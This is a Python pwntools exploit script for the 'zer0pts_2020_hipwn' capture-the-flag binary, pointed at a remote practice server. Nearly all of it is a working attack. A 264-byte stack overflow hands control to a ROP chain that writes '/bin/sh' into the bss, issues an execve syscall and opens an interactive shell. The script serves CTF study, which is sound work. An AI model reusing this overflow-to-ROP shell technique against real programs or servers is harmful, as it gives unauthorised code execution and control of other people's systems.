import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='zer0pts_2020_hipwn'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',28056)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			# io=pdbg.run("local")
			io=pdbg.run("debug")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=pdbg.run("remote")
			libc=ELF('../../x64libc/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		
		pop_rdi = 0x000000000040141c # pop rdu; ret;
		pop_rdx = 0x00000000004023f5 # pop rdx; ret;
		pop_rsi = 0x000000000040141a # pop rsi; pop r15; ret;
		pop_rax = 0x0000000000400121 # pop rax; ret;
		syscall = 0x00000000004024dd # syscall; ret;

		writable_readable_addr = elf.bss() + 0x200

		payload = "A"*264
		payload += p64(pop_rdi) 
		payload += p64(writable_readable_addr)
		payload += p64(0x4004EE)
		payload += p64(pop_rdi)
		payload += p64(writable_readable_addr)
		payload += p64(0x40062F)
		payload += p64(pop_rax)
		payload += p64(0x3b)
		payload += p64(pop_rdi)
		payload += p64(writable_readable_addr)
		payload += p64(pop_rsi)
		payload += p64(0)
		payload += p64(0)
		payload += p64(pop_rdx)
		payload += p64(0)
		payload += p64(syscall)
		io.sendlineafter("?\n", payload)
		io.sendline("/bin/sh\x00") # Sending this to stdin which means the `writable_readable_addr` will have `/bin/sh`





		


		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['execve']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue